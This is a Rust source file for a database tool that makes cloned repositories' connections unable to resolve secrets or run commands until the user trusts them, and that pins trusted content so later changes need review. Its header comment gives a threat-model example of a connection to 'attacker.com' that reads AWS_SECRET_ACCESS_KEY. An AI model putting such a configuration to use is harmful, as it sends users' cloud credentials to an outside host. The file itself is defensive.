//! Repository trust, like VS Code's "workspace trust", pinned to content (ADR-022).
//!
//! The configuration of a cloned repository was written by someone else. If it could
//! resolve secrets without permission, a connection with `host = "attacker.com"` and
//! `password = { secret = "env:AWS_SECRET_ACCESS_KEY" }` would be enough to steal them. So,
//! until the user trusts the repository, its connections neither resolve secrets nor run
//! commands. Personal configuration does not need this: the user wrote it.
//!
//! Trusting is not forever: it records a snapshot of every connection and tunnel in the
//! repository (every field but the display name), and of the team's SSH server keys
//! (`.spelaion/known_hosts`). A `git pull` that changes one, or adds a new one, stops it from
//! being used until the user has seen the change and accepted it.

use std::collections::{BTreeMap, BTreeSet};
use std::fmt;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::error::ConfigError;
use crate::load::{Config, ConnectionEntry, ConnectionId, Source, TunnelEntry};
use crate::model::{ConnectionFile, TunnelFile};

/// Format of `trusted-workspaces.toml` with snapshots.
const VERSION: u32 = 2;

#[derive(Debug, Default, Serialize, Deserialize)]
struct TrustFile {
    /// Missing (0) in files written before ADR-022, which trusted by path only.
    #[serde(default)]
    version: u32,
    #[serde(default)]
    trusted: BTreeSet<PathBuf>,
    /// Trusted before ADR-022 and not loaded since: their snapshots are taken the next time
    /// the app or `spelaiondb trust` loads them ([`TrustStore::adopt`]).
    #[serde(default, skip_serializing_if = "BTreeSet::is_empty")]
    legacy: BTreeSet<PathBuf>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pinned: Vec<Pinned>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Pinned {
    root: PathBuf,
    item: String,
    fields: BTreeMap<String, String>,
}

type Snapshot = BTreeMap<String, String>;

/// Repositories the user trusts, and what each of their items looked like when trusted.
/// Stored in the user's configuration directory: a repository cannot write it.
#[derive(Debug, Clone)]
pub struct TrustStore {
    path: PathBuf,
    trusted: BTreeSet<PathBuf>,
    legacy: BTreeSet<PathBuf>,
    pins: BTreeMap<(PathBuf, String), Snapshot>,
}

/// One field of a repository item, before (as trusted) and after (as it is now). `None`:
/// the field is not set. Repository files hold secret references, never secrets.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FieldChange {
    pub field: String,
    pub before: Option<String>,
    pub after: Option<String>,
}

/// A repository connection or tunnel that is not as the user trusted it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ItemChange {
    /// `connection:<id>` or `tunnel:<name>`: what [`TrustStore::accept`] takes.
    pub item: String,
    /// It did not exist when the repository was trusted.
    pub new: bool,
    pub fields: Vec<FieldChange>,
}

impl fmt::Display for ItemChange {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let (kind, name) = match self.item.split_once(':') {
            Some(parts) => parts,
            None if self.item == KNOWN_HOSTS_ITEM => ("file", ".spelaion/known_hosts"),
            None => ("item", self.item.as_str()),
        };
        if self.new {
            return write!(
                f,
                "the {kind} {name} is new in the repository since you trusted it"
            );
        }
        write!(
            f,
            "the {kind} {name} changed in the repository since you trusted it: "
        )?;
        for (i, change) in self.fields.iter().enumerate() {
            if i > 0 {
                f.write_str("; ")?;
            }
            let shown = |value: &Option<String>| value.clone().unwrap_or_else(|| "(none)".into());
            write!(
                f,
                "{} {} → {}",
                change.field,
                shown(&change.before),
                shown(&change.after)
            )?;
        }
        Ok(())
    }
}

/// The key of the team's SSH server keys in the trust file.
pub const KNOWN_HOSTS_ITEM: &str = "known_hosts";

/// The team's SSH server keys, reviewed in git (ADR-022).
pub fn team_known_hosts(root: &Path) -> PathBuf {
    crate::load::workspace_dir(root).join("known_hosts")
}

/// The key of a repository connection in the trust file.
pub fn connection_item(id: &ConnectionId) -> String {
    format!("connection:{id}")
}

/// The key of a repository tunnel in the trust file.
pub fn tunnel_item(name: &str) -> String {
    format!("tunnel:{name}")
}

/// What is compared: every field but the display name, flattened (`tls.mode`,
/// `hops.0.host`…). Comments and formatting are not part of it.
fn connection_snapshot(file: &ConnectionFile) -> Snapshot {
    let mut file = file.clone();
    file.name = None;
    flatten(toml::Value::try_from(file).unwrap_or(toml::Value::Table(Default::default())))
}

fn tunnel_snapshot(file: &TunnelFile) -> Snapshot {
    flatten(toml::Value::try_from(file).unwrap_or(toml::Value::Table(Default::default())))
}

/// One field per entry: `<hosts> <type>` (with `@cert-authority`/`@revoked` if present)
/// mapped to the key. Comments and blank lines do not count.
fn known_hosts_snapshot(path: &Path) -> Snapshot {
    let mut out = Snapshot::new();
    let content = std::fs::read_to_string(path).unwrap_or_default();
    for line in content.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let fields: Vec<&str> = line.split_whitespace().collect();
        let (marker, rest) = match fields.first() {
            Some(first) if first.starts_with('@') => (Some(*first), &fields[1..]),
            _ => (None, &fields[..]),
        };
        let [hosts, kind, key, ..] = rest else {
            // A broken line is kept as it is: changing it is a change too.
            out.insert(format!("line {line}"), String::new());
            continue;
        };
        let mut name = match marker {
            Some(marker) => format!("{marker} {hosts} {kind}"),
            None => format!("{hosts} {kind}"),
        };
        let base = name.clone();
        let mut n = 2;
        while out.contains_key(&name) {
            name = format!("{base} #{n}");
            n += 1;
        }
        out.insert(name, key.to_string());
    }
    out
}

fn flatten(value: toml::Value) -> Snapshot {
    fn walk(prefix: &str, value: toml::Value, out: &mut Snapshot) {
        let key = |name: &str| {
            if prefix.is_empty() {
                name.to_string()
            } else {
                format!("{prefix}.{name}")
            }
        };
        match value {
            toml::Value::Table(table) => {
                for (name, value) in table {
                    walk(&key(&name), value, out);
                }
            }
            toml::Value::Array(items) => {
                for (i, value) in items.into_iter().enumerate() {
                    walk(&key(&i.to_string()), value, out);
                }
            }
            toml::Value::String(text) => {
                out.insert(prefix.to_string(), text);
            }
            other => {
                out.insert(prefix.to_string(), other.to_string());
            }
        }
    }
    let mut out = Snapshot::new();
    walk("", value, &mut out);
    out
}

fn diff(item: String, before: Option<&Snapshot>, after: &Snapshot) -> Option<ItemChange> {
    let Some(before) = before else {
        let fields = after
            .iter()
            .map(|(field, value)| FieldChange {
                field: field.clone(),
                before: None,
                after: Some(value.clone()),
            })
            .collect();
        return Some(ItemChange {
            item,
            new: true,
            fields,
        });
    };
    let names: BTreeSet<&String> = before.keys().chain(after.keys()).collect();
    let fields: Vec<FieldChange> = names
        .into_iter()
        .filter(|name| before.get(*name) != after.get(*name))
        .map(|name| FieldChange {
            field: name.clone(),
            before: before.get(name).cloned(),
            after: after.get(name).cloned(),
        })
        .collect();
    (!fields.is_empty()).then_some(ItemChange {
        item,
        new: false,
        fields,
    })
}

impl TrustStore {
    pub fn load(user_dir: &Path) -> Result<Self, ConfigError> {
        let path = user_dir.join("trusted-workspaces.toml");
        let file = if path.is_file() {
            crate::load::parse_file::<TrustFile>(&path)?
        } else {
            TrustFile::default()
        };
        let legacy = if file.version < VERSION {
            // Trusted by path only: their content is taken as it is on the next load.
            file.trusted.clone()
        } else {
            file.legacy
        };
        let pins = file
            .pinned
            .into_iter()
            .map(|p| ((p.root, p.item), p.fields))
            .collect();
        Ok(Self {
            path,
            trusted: file.trusted,
            legacy,
            pins,
        })
    }

    pub fn is_trusted(&self, root: &Path) -> bool {
        self.trusted.contains(&canonical(root))
    }

    /// Trusts the repository open in `config` and records each of its items as it is now.
    /// Returns what changed since it was last trusted, if it was (for `spelaiondb trust`).
    pub fn trust(&mut self, config: &Config) -> Result<Vec<ItemChange>, ConfigError> {
        let root = workspace_root(config)?;
        let changes = if self.trusted.contains(&root) && !self.legacy.contains(&root) {
            self.changes(config)
        } else {
            Vec::new()
        };
        self.trusted.insert(root.clone());
        self.legacy.remove(&root);
        self.pin_all(&root, config);
        self.save()?;
        Ok(changes)
    }

    pub fn revoke(&mut self, root: &Path) -> Result<(), ConfigError> {
        let root = canonical(root);
        self.trusted.remove(&root);
        self.legacy.remove(&root);
        self.pins.retain(|(pinned, _), _| pinned != &root);
        self.save()
    }

    /// A repository trusted before ADR-022 gets its snapshots from its current content, as
    /// trust worked then. Returns whether anything was recorded.
    pub fn adopt(&mut self, config: &Config) -> Result<bool, ConfigError> {
        let Some(root) = config.workspace_root.as_deref().map(canonical) else {
            return Ok(false);
        };
        if !self.legacy.contains(&root) {
            return Ok(false);
        }
        self.legacy.remove(&root);
        self.pin_all(&root, config);
        self.save()?;
        Ok(true)
    }

    /// Records one item of the repository open in `config` as it is now: the user accepted
    /// its change, or wrote it through the app. An item that no longer exists is forgotten.
    pub fn accept(&mut self, config: &Config, item: &str) -> Result<(), ConfigError> {
        let root = workspace_root(config)?;
        match current(config, item) {
            Some(snapshot) => {
                self.pins.insert((root, item.to_string()), snapshot);
            }
            None => {
                self.pins.remove(&(root, item.to_string()));
            }
        }
        self.save()
    }

    /// Every repository item that is new or changed since the repository was trusted.
    pub fn changes(&self, config: &Config) -> Vec<ItemChange> {
        let Some(root) = config.workspace_root.as_deref().map(canonical) else {
            return Vec::new();
        };
        if !self.trusted.contains(&root) || self.legacy.contains(&root) {
            return Vec::new();
        }
        repository_items(config)
            .into_iter()
            .filter_map(|(item, snapshot)| {
                let pinned = self.pins.get(&(root.clone(), item.clone()));
                diff(item, pinned, &snapshot)
            })
            .collect()
    }

    /// Is this repository connection as the user trusted it? `Err` says what changed.
    pub(crate) fn check_connection(
        &self,
        root: &Path,
        entry: &ConnectionEntry,
    ) -> Result<(), ItemChange> {
        self.check(
            root,
            connection_item(&entry.id),
            connection_snapshot(&entry.file),
        )
    }

    /// Is the team's `.spelaion/known_hosts` as the user trusted it? `Err` says what changed.
    pub(crate) fn check_known_hosts(&self, root: &Path) -> Result<(), ItemChange> {
        let path = team_known_hosts(root);
        self.check(root, KNOWN_HOSTS_ITEM.into(), known_hosts_snapshot(&path))
    }

    /// Is this repository tunnel as the user trusted it? `Err` says what changed.
    pub(crate) fn check_tunnel(&self, root: &Path, entry: &TunnelEntry) -> Result<(), ItemChange> {
        self.check(root, tunnel_item(&entry.name), tunnel_snapshot(&entry.file))
    }

    fn check(&self, root: &Path, item: String, snapshot: Snapshot) -> Result<(), ItemChange> {
        let root = canonical(root);
        // Not adopted yet: trusted by path, as before ADR-022.
        if self.legacy.contains(&root) {
            return Ok(());
        }
        let pinned = self.pins.get(&(root, item.clone()));
        match diff(item, pinned, &snapshot) {
            Some(change) => Err(change),
            None => Ok(()),
        }
    }

    fn pin_all(&mut self, root: &Path, config: &Config) {
        self.pins.retain(|(pinned, _), _| pinned != root);
        for (item, snapshot) in repository_items(config) {
            self.pins.insert((root.to_path_buf(), item), snapshot);
        }
    }

    fn save(&self) -> Result<(), ConfigError> {
        let file = TrustFile {
            version: VERSION,
            trusted: self.trusted.clone(),
            legacy: self.legacy.clone(),
            pinned: self
                .pins
                .iter()
                .map(|((root, item), fields)| Pinned {
                    root: root.clone(),
                    item: item.clone(),
                    fields: fields.clone(),
                })
                .collect(),
        };
        let content = toml::to_string_pretty(&file)
            .map_err(|e| ConfigError::new(&self.path, e.to_string()))?;
        if let Some(parent) = self.path.parent() {
            std::fs::create_dir_all(parent).map_err(|e| ConfigError::new(parent, e.to_string()))?;
        }
        std::fs::write(&self.path, content).map_err(|e| ConfigError::new(&self.path, e.to_string()))
    }
}

fn workspace_root(config: &Config) -> Result<PathBuf, ConfigError> {
    config
        .workspace_root
        .as_deref()
        .map(canonical)
        .ok_or_else(|| ConfigError::new(&config.user_dir, "no repository is open"))
}

/// The repository's connections and tunnels, with their snapshots.
fn repository_items(config: &Config) -> Vec<(String, Snapshot)> {
    let connections = config
        .connections
        .iter()
        .filter(|c| c.id.source == Source::Workspace)
        .map(|c| (connection_item(&c.id), connection_snapshot(&c.file)));
    let tunnels = config
        .tunnels
        .iter()
        .filter(|t| t.source == Source::Workspace)
        .map(|t| (tunnel_item(&t.name), tunnel_snapshot(&t.file)));
    let known_hosts = config
        .workspace_root
        .as_deref()
        .map(team_known_hosts)
        .filter(|path| path.is_file())
        .map(|path| (KNOWN_HOSTS_ITEM.to_string(), known_hosts_snapshot(&path)));
    connections.chain(tunnels).chain(known_hosts).collect()
}

fn current(config: &Config, item: &str) -> Option<Snapshot> {
    repository_items(config)
        .into_iter()
        .find(|(key, _)| key == item)
        .map(|(_, snapshot)| snapshot)
}

/// Canonical path, so that `C:\repo` and `c:/repo/./` are the same repository.
pub(crate) fn canonical(path: &Path) -> PathBuf {
    std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf())
}
